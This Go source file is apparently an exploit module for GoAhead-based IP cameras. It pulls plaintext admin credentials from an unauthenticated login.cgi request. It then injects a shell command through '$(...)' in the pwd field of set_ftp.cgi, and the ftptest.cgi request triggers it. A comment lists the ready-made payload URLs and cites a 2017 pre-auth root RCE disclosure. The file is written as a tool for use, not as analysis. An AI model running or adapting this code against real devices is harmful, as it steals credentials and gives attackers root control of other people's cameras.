package ipcam

import (
	"errors"
	"fmt"
	"goahead/lib/utils"
	"net"
	"strings"
	"time"
)

func GetIpCamera(Host string) (*Camera, error) {
	Sock, Err := net.DialTimeout("tcp", Host, time.Duration(2)*time.Second)

	if utils.HandleError(Err) {
		return &Camera{}, Err
	}

	return &Camera{
		Socket: Sock,
	}, nil
}

func (C *Camera) GetCredentials() error {
	_, Err := C.Socket.Write([]byte("GET login.cgi HTTP/1.1\r\n\r\n"))
	if Err != nil {
		return Err
	}

	Buffer := make([]byte, 1024)
	for {
		_, Err = C.Socket.Read(Buffer)
		if Err != nil {
			break
		}
	}
	Response := strings.TrimSpace(string(Buffer))

	if !strings.Contains(Response, "loginuser=") {
		return errors.New("buffer doesn't contains credentials")
	}

	C.Username = strings.Split(strings.Split(Response, `loginuser="`)[1], `"`)[0]
	C.Password = strings.Split(strings.Split(Response, `loginpass="`)[1], `"`)[0]

	return nil
}

/*
	-> source: https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html#pre-auth-root-rce

	payloads:
		- http://192.168.1.107/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas=admin&svr=192.168.1.1&port=21&user=ftp&pwd=$(payload here)ftp&dir=/&mode=PORT&upload_interval=0
		- http://192.168.1.107/ftptest.cgi?next_url=test_ftp.htm&loginuse=admin&loginpas=admin
*/

func (C *Camera) UploadBinary(Payload string) error {
	_, Err := C.Socket.Write([]byte(fmt.Sprintf("GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%s&loginpas=%s&svr=192.168.1.1&port=21&user=ftp&pwd=$(%s)ftp&dir=/&mode=PORT&upload_interval=0 HTTP/1.1\r\n", C.Username, C.Password, Payload)))
	if utils.HandleError(Err) {
		return Err
	}
	
	return nil
}

func (C *Camera) CallBinary() error {
	_, Err := C.Socket.Write([]byte(fmt.Sprintf("GET /ftptest.cgi?next_url=test_ftp.htm&loginuse=%s&loginpas=%s HTTP/1.1\r\n", C.Username, C.Password)))
	if utils.HandleError(Err) {
		return Err
	}

	Buffer := make([]byte, 1024)
	for {
		_, Err = C.Socket.Read(Buffer)
		if Err != nil {
			break
		}
	}
	Response := strings.TrimSpace(string(Buffer))

	fmt.Println(Response)
	return nil
}